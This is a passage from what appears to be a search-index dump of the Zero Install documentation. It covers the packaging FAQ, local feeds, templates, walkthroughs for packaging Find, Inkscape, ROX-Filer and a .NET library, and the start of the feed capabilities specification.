can't find a generic binary for the program I want to package! <p>Popular projects usually provide a \"generic\" binary tarball, which works on most Linux distributions. This is the best archive to put in the feed. If there isn't one, it might mean that the developers couldn't get a single binary to work on multiple distributions, or it might just mean they haven't tried.</p> <p>Often, a Red Hat RPM will work just fine on Debian (e.g. the LyX feed), or a .deb will work on Red Hat, etc. If there are several options, pick the one for the distribution which is furthest behind (e.g. Red Hat rather than Fedora). Packages for old systems often still work with newer ones, but not the other way around.</p> My program assumes it's running from <code>/usr/games</code>. <p>Games have an annoying habit of trying to <code>cd</code> to a hard-coded directory in their start-up script. You could try asking the author to fix it (<code>cd \"$(dirname $0)\"</code> would work just as well). It's also possible to patch the download using a <code>&lt;recipe&gt;</code> element, but the GUI doesn't provide an interface for this. The trick here is getting the ID right; you need the digest of the directory structure after the patch has been applied. <code>0install digest</code> can help here.</p>"},{"location":"packaging/guide-gui/#further-reading","title":"Further reading","text":"Example: Find Find is a Python program with a dependency on a Python library. This example shows how to depend on other components. Example: Inkscape Inkscape is distributed as a binary RPM (among other formats). This guide shows how to publish these RPMs so that they can be run using Zero Install (by users without root access or on Debian systems, for example). Example: ROX-Filer ROX-Filer is a C program, which requires different binaries for different platforms. These binaries are built and published in interface files maintained by different people. Using the injector's feed mechanism, users only need to use the main ROX-Filer interface and will automatically get a binary for their platform, from the maintainer of that binary. 0publish A command reference for the <code>0publish</code> command. Compiling with SCons and GTK Now that we've made SCons available through Zero Install, we can use it in our build scripts. This example shows how to build a GTK application written in C using Zero Install to get the build tool and the header files automatically."},{"location":"packaging/local-feeds/","title":"Local feeds","text":"<p>Normally, 0install downloads a feed from the web, selects a version, downloads the archive for that version, and runs it. However, 0install can also be used locally (e.g. to run a program you are currently writing, which hasn't been released yet). There are several reasons why you might want to do this:</p> <ul> <li>0install can select and download your program's build or runtime dependencies.</li> <li>It provides a cross-platform way to set environment variables and start your program.</li> <li>You can use 0release to generate releases automatically.</li> </ul>"},{"location":"packaging/local-feeds/#a-simple-example","title":"A simple example","text":"<p>Let's say you have a simple Python 2 program, <code>hello.py</code>:</p> <pre><code>print \"Hello World!\"\n</code></pre> <p>You could make this runnable by specifying a shebang line. But that wouldn't work on Windows (which doesn't support them). Also, different versions of Linux need different lines (e.g. <code>#!/usr/bin/python</code> on Debian, but <code>#!/usr/bin/python2</code> on Arch).</p> <p>Instead, we can create a local feed to say how to run it. Create <code>hello.xml</code> in the same directory:</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;Hello&lt;/name&gt;\n  &lt;summary&gt;minimal demonstration program&lt;/summary&gt;\n\n  &lt;implementation id=\".\" version=\"0.1-pre\"&gt;\n    &lt;command name='run' path='hello.py'&gt;\n      &lt;runner interface='https://apps.0install.net/python/python.xml'&gt;\n        &lt;version before='3'/&gt;\n      &lt;/runner&gt;\n    &lt;/command&gt;\n  &lt;/implementation&gt;\n&lt;/interface&gt;\n</code></pre> <p>Setting <code>id=\".\"</code> says that the implementation of this interface is the directory containing the feed (whereas normally we'd specify a digest and a URL from which to download the archive).</p> <p>There are two other differences to note: there is no digital signature at the end (we assume that no attacker could intercept the file between your harddisk and you ;-), and the version number ends in a modifier (<code>-pre</code> in this case), showing that it hasn't been released.</p> <p>You can now use this feed with the usual 0install commands. For example:</p> <pre><code>$ 0install run hello.xml\nHello World!\n\n$ 0install add hello-dev hello.xml\n$ hello-dev\nHello World!\n\n$ 0install select hello.xml\n\\- URI: /home/bob/hello/hello.xml\n  Version: 0.1-pre\n  Path: /home/bob/hello\n  \\- URI: https://apps.0install.net/python/python.xml\n    Version: 2.7.3\n    Path: (package:deb:python2.7:2.7.3:x86_64)\n</code></pre> <p>This will work on Linux, macOS, Windows, etc.</p>"},{"location":"packaging/local-feeds/#next-steps","title":"Next steps","text":"<p>Some more things you can do with your new local feed:</p> <ul> <li>Depend on other libraries or tools (see the feed specification for reference).</li> <li>Compile source code using 0compile.</li> <li>Make a release using 0release.</li> <li>Test against different versions of dependencies using 0test.</li> </ul> <p>See the example templates for projects in different languages and using various build systems.</p>"},{"location":"packaging/templates/","title":"Templates","text":"<p>This page lists some example code packages which you can use as templates when creating a new program that will be distributed using 0install, or as examples for your own programs.</p>"},{"location":"packaging/templates/#c","title":"C","text":"GNU-Hello A sample C program built using autoconf and make. Shows how to make a source package that can be used by 0compile to create a binary release. See 0release: binaries for details. hello-scons Another C program, but this time using SCons instead of Make as the build tool. See 0compile: Scons for details. hello-c-cmake A C program built using CMake."},{"location":"packaging/templates/#java","title":"Java","text":"hello-java A Java program, built using SCons. Gets SCons, the Java JDK and the Java JRE through 0install. Maven integration with pom2feed Build your project with Maven, creating a 0install feed for it automatically."},{"location":"packaging/templates/#net","title":".NET","text":"Packaging .NET libraries This tutorial explains how to create feeds for a .NET application with a dependency on a .NET library using 0publish-gui."},{"location":"packaging/templates/#python","title":"Python","text":"hello-python A simple Python program. Depends on Python 2.x using 0install. See the 0release tutorial for more information."},{"location":"packaging/examples/dotnet-lib/","title":".NET library","text":"<p>This tutorial explains how to create feeds for a .NET application with a dependency on a .NET library using 0publish-gui.</p>"},{"location":"packaging/examples/dotnet-lib/#the-application-exe","title":"The application (EXE)","text":"<p>When using the \"New Feed Wizard\" for creating the feed for the EXE make sure to set \"External dependencies\" to <code>True</code> on the \"Fill in missing details\" page. This will automatically add the following line to your feed:</p> <pre><code>&lt;runner interface=\"https://apps.0install.net/dotnet/clr-monopath.xml\" command=\"run-gui\"/&gt;\n</code></pre> <p>This enables Zero Install to inject DLLs provided by feeds into .NET applications. This is required because, unlike regular DLLs, .NET DLLs are not located via the <code>PATH</code> environment variable.</p> <p>You can then add a dependency on your library feed by adding something like this inside the <code>&lt;implementation&gt;</code> tag:</p> <pre><code>&lt;requires interface=\"http://somedomain.com/somelibrary.xml\"&gt;\n  &lt;environment insert=\".\" mode=\"append\" name=\"MONO_PATH\"/&gt;\n&lt;/requires&gt;\n</code></pre> <p>Note that <code>MONO_PATH</code> does not mean that this requires Mono. It just shares the same environment variable name for uniformity.</p>"},{"location":"packaging/examples/dotnet-lib/#the-library-dll","title":"The library (DLL)","text":"<p>To create a feed for the library start by selecting \"New Empty Feed\" and copying this into the XML view of the editor:</p> <pre><code>&lt;interface uri=\"http://somedomain.com/somelibrary.xml\" xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;Some library&lt;/name&gt;\n  &lt;summary&gt;a library for something&lt;/summary&gt;\n  &lt;implementation version=\"1.0\"&gt;\n    &lt;archive href=\"http://somedomain.com/somelibrary.zip\"/&gt;\n  &lt;/implementation&gt;\n&lt;/interface&gt;\n</code></pre> <p>You can then fill in the placeholder names and URLs. Once you are done, select the <code>archive</code> node in the tree-view and click on the \"Add missing\" button on the right hand-side. This performs the same archive download, extraction and hashing that the \"New Feed Wizard\" normally would.</p>"},{"location":"packaging/examples/find/","title":"Find","text":"<p>In the main packaging guide (which should be read before this one) we saw how to make a simple Python program available. When the user asked to run the program, the injector downloaded it for them and cached it. However, most programs depend on other programs, libraries and resources and these can also be fetched using the injector. Our example package will be Find, a little utility for searching for files which depends on the ROX-Lib Python library.</p>"},{"location":"packaging/examples/find/#running-find-directly","title":"Running Find directly","text":"<p>Start by downloading Find-006. This is just a normal application, not specially designed for the injector. If you try to run it, you should get an error:</p> <pre><code>$ wget http://www.hayber.us/rox/find/Find-006.tgz\n$ tar xzf Find-006.tgz\n$ cd Find\n$ ./AppRun\n*** This program needs ROX-Lib2 (version 2.0.0) to run.\n</code></pre> <p>Note</p> <p>If it runs without an error, then either you've installed ROX-Lib manually (not using the injector) or your <code>PYTHONPATH</code> already points to it.</p>"},{"location":"packaging/examples/find/#creating-the-interface-file","title":"Creating the interface file","text":"<p>Start by creating an XML interface file (<code>Find.xml</code>) as we did before:</p> <pre><code>$ 0publish Find.xml\n</code></pre> <p>Fill in the fields as before. The only difference is the addition of the <code>requires</code> element, which states that this program requires ROX-Lib, and the <code>main</code> attribute which is now <code>AppRun</code>. The final result should look something like this:</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;?xml-stylesheet type='text/xsl'\n     href='http://0install.net/2006/stylesheets/interface.xsl'?&gt;\n\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;Find&lt;/name&gt;\n  &lt;summary&gt;a find-in-files utility&lt;/summary&gt;\n  &lt;description&gt;\nSearches files for specific text, displaying the results in a window. Double click\non the result line(s) to open the file at that point.\n\nConfiguration options are available to customize the search command and the editor with which to\nopen the files.\n  &lt;/description&gt;\n  &lt;homepage&gt;http://www.hayber.us/rox/Find&lt;/homepage&gt;\n  &lt;icon type='image/png' href='http://www.hayber.us/0install/Find.png'/&gt;\n\n  &lt;group main='AppRun'&gt;\n    &lt;requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"&gt;\n      &lt;environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/&gt;\n    &lt;/requires&gt;\n    &lt;implementation id='.' version='6'/&gt;\n  &lt;/group&gt;\n</code></pre> <p>Let's go over the group part in detail:</p> <ul> <li>The <code>&lt;group&gt;</code> element contains a set of implementations of the interface (versions of Find) and their requirements. The group saves us having to repeat the requirements for each implementation (since they often don't change). We have also given the <code>main</code> attribute here, since all versions of Find are run using a script with this name.</li> <li>We have a single requirement, ROX-Lib, which is identified by the URI of its interface. The URI is chosen by the publisher of the ROX-Lib interface, just as we chose the URI for our SCons interface in the previous tutorial.</li> <li>The <code>&lt;environment&gt;</code> element inside tells the injector how to make its choice known to Find. In this case, it is by inserting <code>/path/of/cache/DIGEST/ROX-Lib2/python</code> to the beginning of the <code>PYTHONPATH</code> environment variable. When Find (a Python program) does <code>import rox</code>, it will then get the chosen version of ROX-Lib.</li> <li>Also inside the group we have a single (local) implementation, as before. The id gives the location of the implementation directory relative to the interface file. In this case, we are assuming that the <code>Find.xml</code> file is in the same directory as the <code>AppRun</code> script.</li> </ul> <p>Save the interface using the default file name (a temporary file chosen by <code>0publish</code>) and try running it:</p> <pre><code>0install run ./Find.xml\n</code></pre> <p>If you don't already have ROX-Lib, you will be prompted to download it as usual. Once ROX-Lib is available, Find runs:</p> <p></p> <p>As usual, you can run <code>0install run -g ./Find.xml</code> to force the 0install GUI to appear. You will see that there is a single version of Find available, but that you can choose any version of ROX-Lib to use with it.</p>"},{"location":"packaging/examples/find/#adding-the-archive","title":"Adding the archive","text":"<p>We will now change the implementation as we did before so that the injector will download Find for us instead of requiring it to be on the machine already:</p> <pre><code>$ 0publish Find.xml \\\n  --set-version=6 \\\n  --set-released=today \\\n  --archive-url=http://www.hayber.us/rox/find/Find-006.tgz \\\n  --archive-file=../Find-006.tgz \\\n  --archive-extract=Find\n</code></pre> <p>As the archive file isn't in the current directory, we give its location with <code>--archive-file</code>. <code>0publish</code> needs this to get the digest, but it doesn't download the archive from the network because it wouldn't be able to check that it hasn't been tampered with (although if the program's author doesn't provide a signature then there may be no way to check anyway).</p> <p>We also use the <code>--archive-extract</code> attribute. This is because each Find archive contains a single top-level directory, which we don't need (and the name might change in different versions, e.g. if the author decides to include the version number). Extracting just the contents means the every version will have the same structure, which makes it easier for other programs to depend on it. This is mostly useful for libraries like ROX-Lib, where we need to know that the path will always be <code>lib</code>, not <code>libfoo-1.1/lib</code> with version 1.1 and <code>libfoo-1.2/lib</code> with version 1.2, since a fixed path has to go in the <code>environment</code> element above.</p> <p>The resulting file will contain this:</p> <pre><code>    &lt;implementation id='sha1=ff9d9e11fde0a146c7e1781511fd9afb17752e34' released=\"2006-05-19\" version='6'&gt;\n      &lt;archive href=\"http://www.hayber.us/rox/find/Find-006.tgz\" size=\"23161\" extract='Find'/&gt;\n    &lt;/implementation&gt;\n</code></pre> <p>The attributes of <code>&lt;archive&gt;</code> are:</p> <code>href</code> a URL from which the archive can be downloaded (in escaped form, so a space is written as %20, etc). <code>size</code> the size of the archive (for progress bars). <code>extract</code> (optional) a subdirectory of the archive to use. We could have omitted this and changed the implementation's <code>main</code> to <code>Find/AppRun</code> instead, but it's better to keep the main attribute the same, if possible. <p>If you run the new <code>Find.xml</code>, the injector should download and unpack the archive into the cache, and run Find from it.</p>"},{"location":"packaging/examples/find/#note-on-weaknesses-in-sha-1","title":"Note on weaknesses in SHA-1","text":"<p>Some weaknesses in the SHA-1 algorithm have been discovered. At present, it is still strong enough for our use, but you may wish to use some other algorithm, with the <code>--manifest-algorithm</code> option. See the specification for a list of available secure hashing algorithms and which versions of the injector support them.</p> <p>See the HASH COLLISION Q&amp;A for more details.</p>"},{"location":"packaging/examples/find/#publishing-the-interface","title":"Publishing the interface","text":"<p>The <code>Find.xml</code> interface file can now be signed and published as described before:</p> <pre><code>$ 0publish Find.xml --set-interface-uri=http://www.hayber.us/0install/Find\n$ 0publish Find.xml --xmlsign\n</code></pre>"},{"location":"packaging/examples/find/#registering-the-local-feed","title":"Registering the local feed","text":"<p>We have already seen how to use a local <code>Find.xml</code> file inside the Find directory to run the local version with a chosen version of ROX-Lib (i.e., by setting the <code>id</code> attribute to <code>.</code>). It is quite useful to add this file to your CVS (or similar system) to let developers test new versions easily, since it will get the libraries for them.</p> <p>In fact, we'd often like to see both downloadable implementations (e.g., official releases) and local versions (e.g., developer CVS checkouts) of Find together. To do this, all we need is to add a <code>feed-for</code> line in the local <code>Find/Find.xml</code> file (the one where the implementation <code>id</code> is <code>.</code>):</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;feed-for interface='http://www.hayber.us/0install/Find'/&gt;\n</code></pre> <p>You can now register the local feed in the normal way:</p> <pre><code>0install add-feed Find.xml\n</code></pre> <p>When another program runs Find using its official URI, this local version will be included in the list of available versions that can be selected. It is traditional to add <code>.0</code> to the end of the version number for CVS versions, so that the CVS version will be preferred to the previous release.</p>"},{"location":"packaging/examples/find/#problems-with-manifest-digests","title":"Problems with manifest digests","text":"<p>There is one possible problem with the digests, where the 'actual' manifest changes each time the archive is extracted! This happens when you include only some deep subdirectories in the archive, but not the top-level directory. Eg:</p> <pre><code>$ tar czf archive.tgz deeply/nested/path\n</code></pre> <p>When tar extracts the archive, it restores the original mtime of 'path', but creates 'deeply' and 'nested' with the current time. This is what causes the digest to change. There are two possible solutions:</p> <ul> <li>Always list all top-level directories when creating archives.</li> <li>Use any algorithm except <code>sha1</code>, as this is the only one that includes directory mtimes in the digest (for backwards compatibility).</li> </ul>"},{"location":"packaging/examples/inkscape/","title":"Inkscape","text":"<p>The Inkscape project makes available a binary RPM which works on various platforms. However, using this RPM directly has a few limitations for users:</p> <ul> <li>They must be root to install it.</li> <li>It doesn't work on all distributions (e.g., Debian).</li> <li>The system won't periodically check for updates.</li> </ul> <p>These limitations can be avoided by creating a Zero Install interface file for it. This guide goes over the steps quite quickly. For more details see the packaging main guide.</p> <p>Note</p> <p>The original Inkscape binary RPM was compiled with binreloc support disabled, which prevented it from finding its icons (it used hard-coded paths). Jean-Fran\u00e7ois Lemaire, the creator of the RPM, has kindly recompiled it for us with relocation support turned on.</p>"},{"location":"packaging/examples/inkscape/#creating-the-interface","title":"Creating the interface","text":"<p>We'll be using the <code>0publish</code> command to create the interface file. If you don't have it already, create an alias for <code>0publish</code> in the usual way:</p> <pre><code>$ 0install add 0publish http://0install.net/2006/interfaces/0publish\n</code></pre> <p>To create the interface file:</p> <ol> <li> <p>Download the static binary RPM:</p> <pre><code>$ wget http://users.skynet.be/jflemaire/files/inkscape-0.43-0.i386.rpm\n</code></pre> </li> <li> <p>Create the interface:</p> <pre><code>$ 0publish Inkscape.xml\n</code></pre> <p>Fill in the <code>name</code>, <code>summary</code>, <code>description</code>, <code>icon</code> and <code>homepage</code> fields. Set <code>main='usr/bin/inkscape'</code> on the <code>group</code> element. Save and quit (using the default filename).</p> </li> <li> <p>Add version 0.43 with the location of the static RPM:</p> <pre><code>$ 0publish Inkscape.xml \\\n    --set-version=0.43 \\\n    --archive-url=http://users.skynet.be/jflemaire/files/inkscape-0.43-0.i386.rpm \\\n    --set-released=today \\\n    --set-arch=Linux-i486\n</code></pre> </li> </ol>"},{"location":"packaging/examples/inkscape/#testing-it","title":"Testing it","text":"<p>You can run the new XML file with <code>0install</code> to download and run Inkscape:</p> <pre><code>$ 0install run ./Inkscape.xml\n</code></pre> <p></p>"},{"location":"packaging/examples/inkscape/#signing-and-publishing","title":"Signing and publishing","text":"<p>Now we need to sign the XML file using our GPG key. If you don't already have a GPG key, create one now:</p> <pre><code>$ gpg --gen-key\n</code></pre> <p>We also need to decide where the Inkscape XML file will be made available. This URL should not change, since other programs will link to it. We'll assume <code>http://inkscape.org/2006/ZeroInstall/Inkscape.xml</code> here.</p> <p>To set the URI and sign the interface:</p> <pre><code>$ 0publish Inkscape.xml \\\n  --set-interface-uri=http://inkscape.org/2006/ZeroInstall/Inkscape.xml \\\n  --xmlsign\nExported public key as 'AE07828059A53CC1.gpg'\n</code></pre> <p>Upload the resulting <code>Inkscape.xml</code> and GPG files to the same directory on the web-server. The XML file should look something like the Inkscape.xml test interface.</p>"},{"location":"packaging/examples/inkscape/#using-the-published-interface","title":"Using the published interface","text":"<p>You can now run Inkscape like this:</p> <pre><code>$ 0install run http://inkscape.org/2006/ZeroInstall/Inkscape.xml\n</code></pre> <p>Users can now install Inkscape using this URL, either using some graphical installer (like ROX's AddApp or Xfce 4.4's panel). Command-line users can get it like this:</p> <pre><code>$ 0install add inkscape http://inkscape.org/2006/ZeroInstall/Inkscape.xml\n</code></pre> <p>They can then run it by typing <code>inkscape</code>. To choose a different version:</p> <pre><code>$ 0install update --gui inkscape\n</code></pre>"},{"location":"packaging/examples/inkscape/#marking-as-stable","title":"Marking as stable","text":"<p>After the release has been out for a while, mark it as stable:</p> <pre><code>$ 0publish Inkscape.xml --stable\n</code></pre> <p>Users can configure the injector either to prefer stable versions or to select testing versions by default. This gives your more advanced users the chance to provide feedback before you roll a new release out to all users.</p>"},{"location":"packaging/examples/inkscape/#making-a-new-release","title":"Making a new release","text":"<p>When a new static binary RPM is released, add the new version to the XML as follows:</p> <ol> <li>Download the new RPM (if you're not the person who made it).</li> <li>Add it to the XML (note use of <code>add-version</code> rather than <code>set-version</code> here):</li> </ol> <pre><code>$ 0publish Inkscape.xml \\\n    --add-version=0.44 \\\n    --archive-url=http://users.skynet.be/jflemaire/files/inkscape-0.44-0.i386.rpm \\\n    --set-released=today \\\n    --set-arch=Linux-i486\n</code></pre>"},{"location":"packaging/examples/rox/","title":"ROX-Filer","text":"<p>This guide shows some more advanced features of Zero Install:</p> <ul> <li>Creating platform-specific binaries (ROX-Filer is written in C).</li> <li>Local interfaces in source releases.</li> <li>Adding extra feeds (the maintainer of the PPC and ix86 interfaces are different people, but users get the right binary automatically).</li> </ul> <p>This guide assumes you've already read the packaging guide, which explains how to create and publish interface files. We won't explain all the concepts in detail again, we'll just show how to script the steps.</p>"},{"location":"packaging/examples/rox/#general-operation","title":"General operation","text":"<p><code>0publish</code> edits interface files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key.</p> <p>You can create an alias for <code>0publish</code> in the usual way, to save typing:</p> <pre><code>$ 0install add 0publish http://0install.net/2006/interfaces/0publish\n</code></pre>"},{"location":"packaging/examples/rox/#creating-a-binary-of-rox-filer","title":"Creating a binary of ROX-Filer","text":"<p>For this example we'll compile a binary of ROX-Filer for our platform (we'll assume there isn't one already) and make a feed for other people with the same platform (I'll use ppc64 for the examples). Start by creating an archive as normal:</p> <ol> <li> <p>Download the ROX-Filer source release (and detached signature):</p> <pre><code>$ wget http://heanet.dl.sourceforge.net/sourceforge/rox/rox-2.4.1.tgz\n$ wget http://heanet.dl.sourceforge.net/sourceforge/rox/rox-2.4.1.tgz.sig\n$ gpg rox-2.4.1.tgz.sig\ngpg: Signature made Fri 30 Dec 2005 17:32:53 GMT using DSA key ID 59A53CC1\ngpg: Good signature from \"Thomas Leonard &lt;...&gt;\"\n</code></pre> </li> <li> <p>Build as normal:</p> <pre><code>$ tar xzf rox-2.4.1.tgz\n$ cd rox-2.4.1\n$ ./ROX-Filer/AppRun --compile\n</code></pre> </li> <li> <p>Delete the debugging symbols and the <code>build</code> and <code>src</code> directories to save space:</p> <pre><code>$ rm -r ROX-Filer/{ROX-Filer.dbg,build,src}\n</code></pre> </li> <li> <p>The ROX-Filer source download includes a local interface file called <code>ROX-Filer.xml</code>. This allows people to register local versions using <code>0install add-feed</code>. Set the release date and architecture in it:</p> <pre><code>$ 0publish --set-released 2006-02-26 ROX-Filer.xml\n$ 0publish --set-arch Linux-ppc64 ROX-Filer.xml\n</code></pre> <p>You can also edit it to change the name and description if you want. The file should now look like this:</p> <pre><code>&lt;?xml version='1.0'?&gt;\n&lt;interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface'&gt;\n  &lt;name&gt;ROX-Filer-ppc64&lt;/name&gt;\n  &lt;summary&gt;PPC64 binaries for ROX-Filer&lt;/summary&gt;\n  &lt;description&gt;\n    ROX-Filer is a fast and powerful graphical file manager. It has full drag-and-drop support\n    and background file operations, and is highly configurable. It can also act as a pinboard,\n    allowing you to pin frequently used files to the desktop background.\n  &lt;/description&gt;\n  &lt;feed-for interface='http://rox.sourceforge.net/2005/interfaces/ROX-Filer'/&gt;\n  &lt;group main='ROX-Filer/AppRun'&gt;\n    &lt;implementation id=\".\" version=\"2.4.1\" released='2006-02-26' arch='Linux-ppc64'/&gt;\n  &lt;/group&gt;\n&lt;/interface&gt;\n</code></pre> </li> <li> <p>Add the architecture to the directory name and tar it all up (we include the architecture in the directory and archive names for clarity only; you can name them whatever you like):</p> <pre><code>$ cd ..\n$ mv rox{,-linux-ppc64}-2.4.1\n$ tar czf rox-linux-ppc64-2.4.1{.tgz,}\n</code></pre> </li> <li> <p>Upload it somewhere. I'll assume <code>http://example.org/rox-linux-ppc64-2.4.1.tgz</code> in the following examples.</p> </li> </ol>"},{"location":"packaging/examples/rox/#adding-the-archive-to-the-interface","title":"Adding the archive to the interface","text":"<p>To make our new binary available through Zero Install:</p> <ol> <li> <p>Take a copy of the local interface from the archive. We'll use <code>0publish</code> to change the <code>id</code> from <code>.</code> to the archive's digest and to add an <code>&lt;archive&gt;</code> element:</p> <pre><code>$ cp rox-linux-ppc64-2.4.1/ROX-Filer.xml ROX-Filer-ppc64\n$ 0publish ROX-Filer-ppc64 \\\n    --archive-url http://example.org/rox-linux-ppc64-2.4.1.tgz  \\\n    --archive-file rox-linux-ppc64-2.4.1.tgz \\\n    --archive-extract rox-linux-ppc64-2.4.1\n</code></pre> <p>The local .tgz file is used by <code>0publish</code> to get the size and manifest digest. The extract value is used as the <code>&lt;archive&gt;</code>'s extract attribute and must match the name of the top-level directory in the archive.</p> <p>If you now view the <code>ROX-Filer-ppc64</code> file, you should see that <code>0publish</code> has converted the old <code>&lt;implementation&gt;</code> to give the digest and download location:</p> <pre><code>&lt;group main=\"ROX-Filer/AppRun\"&gt;\n  &lt;implementation arch=\"Linux-ppc64\" id=\"sha1=2bce88f31415898760373fff900890a8719ab1e6\" released=\"2006-02-26\" version=\"2.4.1\"&gt;\n    &lt;archive extract=\"rox-linux-ppc64-2.4.1\" href=\"http://example.org/rox-linux-ppc64-2.4.1.tgz\" size=\"1375566\"/&gt;\n  &lt;/implementation&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>You should be able to download and test your binary with this command:</p> <pre><code>$ 0install run ./ROX-Filer-ppc64\n</code></pre> </li> </ol>"},{"location":"packaging/examples/rox/#publishing-the-interface-with-zero-install","title":"Publishing the interface with Zero Install","text":"<ol> <li> <p>Set the uri at the top of the file to where-ever you're going to upload it:</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"\n       uri='http://example.com/2006/0launch/ROX-Filer-ppc'&gt;\n</code></pre> <p>Todo</p> <p>0publish should have a working <code>--local</code> option! (note: from version 0.3, 0publish does support --local in this case, when creating a new interface)</p> </li> <li> <p>Sign and upload the interface (see the packaging guide for information about creating, exporting and uploading your GPG key):</p> <pre><code>$ 0publish --gpgsign ROX-Filer-ppc64\n$ mv ROX-Filer-ppc64 /var/www/...\n</code></pre> </li> </ol> <p>Other users of ppc64 machines can now either run this directly, or add it as a feed (so it will be used by other programs trying to run ROX-Filer):</p> <pre><code>$ 0install add-feed http://example.com/2006/0launch/ROX-Filer-ppc\n</code></pre> <p>You should now tell the maintainer of the master feed about this one, so that they can add a <code>&lt;feed&gt;</code> element to the master copy to save users from having to add the feed manually. For an example of a master interface with feeds for different architectures, take a look at the <code>&lt;feed&gt;</code> elements in the real ROX-Filer interface.</p>"},{"location":"specifications/","title":"Specifications overview","text":"Feed files This document is a formal description of the XML feed file format. An interface describes a program, library or other component. A feed provides a list of known implementations of the interface (versions of the program) and details about how to get them, how to check that they are authentic, how to run them and what other components they depend on. Capabilities extension This document is a formal description of the Capabilities extension of the feed format. Capabilities provide information for desktop integration of applications, such as supported MIME types. Catalog files This document is a formal description of the XML catalog format. A catalog contains meta-data for a collection of feeds. Catalogs make it easier to find feeds for specific applications. Selections files This document describes the format of 0install's XML selections documents. A selections document contains all the information needed to launch a program. 0install generates a selections document by collecting information from multiple feeds and then running a solver to choose the best combination of components. Manifest files Zero Install implementations are directory trees identified by an algorithm name (e.g., \"sha1\"), and digest of their contents calculated using that algorithm. Adding, deleting, renaming or modifying any file in a tree will change its digest. It should be infeasibly difficult to generate a new tree with the same digest as a given tree. Thus, if you know the digest of the implementation you want, and someone gives you a tree with that digest, you can trust that it is the implementation you want. This document describes how a digest is calculated from a directory tree."},{"location":"specifications/capabilities/","title":"Capabilities extension","text":"<p>This document is a formal description of the Capabilities extension of the feeds format. A capability tells the desktop environment what an application can do (e.g., suported file types) and in which fashion this can be represented to the user. This is used for desktop integration (currently only supported on Windows).</p> <p> XML Schema Definition</p>"},{"location":"specifications/capabilities/#syntax","title":"Syntax","text":"<p>Capability extensions for feeds have following syntax (<code>?</code> follows optional items, <code>*</code> means zero-or-more, order of elements is not important):</p> <pre><code>&lt;?xml version='1.0'?&gt;\n&lt;interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface' uri='...'&gt;\n  ...\n\n  &lt;capabilities xmlns='http://0install.de/schema/desktop-integration/capabilities' os='...' ?&gt;\n    [capability] *\n  &lt;/capabilities&gt; *\n&lt;/interface&gt;\n</code></pre> <code>os</code> Specifies for which operating system the capabilities are applicable (e.g., <code>os=\"Windows\"</code> for Windows systems)."},{"location":"specifications/capabilities/#capability-types","title":"Capability types","text":""},{"location":"specifications/capabilities/#file-types","title":"File types","text":"<p>An application's ability to open certain file types. </p> <pre><code>&lt;file-type id='...' explicit-only='true' ?&gt;\n  &lt;extension value='...' mime-type='...' ? perceived-type='...' ?/&gt; *\n  &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n  [verb] *\n  [icon] *\n&lt;/file-type&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this file type within the feed. Must be a safe ID. <code>explicit-only</code> When set to <code>true</code> the app is not set as the default handler for this file type without explicit confirmation from the user.   Use this to exclude exotic capabilities from default integration categories. <code>&lt;extension&gt;</code> A file extension used to identify a file type. <code>value</code> is the file extension including the leading dot (e.g., <code>.jng</code>). <code>mime-type</code> is the (optional) MIME type associated with the file extension. <code>perceived-type</code> specifies the broad category of file types this file type falls into. Well-known values on Windows are: <code>folder</code>, <code>text</code>, <code>image</code>, <code>audio</code>, <code>video</code>, <code>compressed</code>, <code>document</code>, <code>system</code>, <code>application</code> <code>&lt;description&gt;</code> A (localized) description of the file type. <p>See: Verbs, Icons</p>"},{"location":"specifications/capabilities/#url-protocols","title":"URL protocols","text":"<p>An application's ability to handle certain URL protocols/schemas such as HTTP. </p> <pre><code>&lt;url-protocol id='...' explicit-only='true' ?&gt;\n  &lt;known-prefix value='...'/&gt; *\n  &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n  [verb] *\n  [icon] *\n&lt;/url-protocol&gt;\n</code></pre> <code>id</code> If you are registering an application-specific URL protocols (e.g., <code>myapp:...</code>) this value must be the schema name (e.g., <code>myapp</code>). If you are registering support for a well-known protocol such as HTTP, this value instead is just a unique identifier within the feed. The schema is instead specified using <code>&lt;known-prefix&gt;</code> (see below). <code>explicit-only</code> When set to <code>true</code> the app is not set as the default handler for this URL protocol without explicit confirmation from the user. <code>&lt;known-prefix&gt;</code> Names a well-known protocol such as <code>http</code> or <code>ftp</code>. Not for application-specific protocols! <code>&lt;description&gt;</code> A (localized) description of the URL protocol. <p>See: Verbs, Icons</p>"},{"location":"specifications/capabilities/#context-menu-entries","title":"Context menu entries","text":"<p>Entries in the file manager's context menu for all file types. </p> <pre><code>&lt;context-menu id='...' target='...' ? explicit-only='true' ?&gt;\n  &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n  &lt;extension value='...'/&gt; *\n  [verb] *\n  [icon] *\n&lt;/context-menu&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this context menu entry within the feed. Must be a safe ID. <code>target</code> Controls whether the context menu entry is display for all files (<code>files</code>), only executable files (<code>executable-files</code>), all directories (<code>directories</code>) or all filesystem objects (<code>all</code>). Defaults to <code>files</code> if not set. <code>explicit-only</code> When set to <code>true</code> this context menu entry is not added without explicit confirmation from the user. <code>&lt;extension&gt;</code> - since version 2.21 File extension this context menu entry is displayed for. Only applicable when <code>target</code> is <code>files</code> or unset.   The context menu is shown for all file types when no extensions are specified. 